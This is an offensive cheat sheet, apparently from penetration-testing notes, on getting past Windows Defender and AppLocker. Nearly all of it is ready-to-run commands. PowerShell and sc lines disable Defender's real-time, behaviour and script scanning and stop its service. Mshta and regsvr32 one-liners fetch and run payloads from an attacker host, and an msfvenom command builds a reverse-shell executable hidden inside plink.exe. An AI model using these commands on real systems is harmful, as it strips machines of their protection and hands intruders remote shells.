# Windows Defender & AppLocker Evasion

## Check Defender Status
```powershell
Get-MpComputerStatus
```

## Disable Defender (requires admin)
```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisableBehaviorMonitoring $true
Set-MpPreference -DisableScriptScanning $true
Add-MpPreference -ExclusionPath C:\temp
```

## Stop Defender Service
```cmd
sc stop WinDefend
sc config WinDefend start= disabled
```

## Bypass AppLocker (LOLBins)
```powershell
# Alternate execution locations
C:\Windows\System32\spool\drivers\color\shell.exe
C:\ProgramData\shell.exe

# InstallUtil
C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U shell.exe

# Mshta
mshta http://$ATTACK_IP/payload.hta

# Regsvr32 (SCT)
regsvr32.exe /s /u /i:http://$ATTACK_IP/payload.sct scrobj.dll

# Cscript/Wscript
cscript //nologo payload.vbs

# Rundll32
rundll32.exe shell.dll,EntryPoint
```

## Obfuscate Payloads for Defender
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=$ATTACK_IP LPORT=4444 -f exe -o shell.exe -x /usr/share/windows-binaries/plink.exe
```
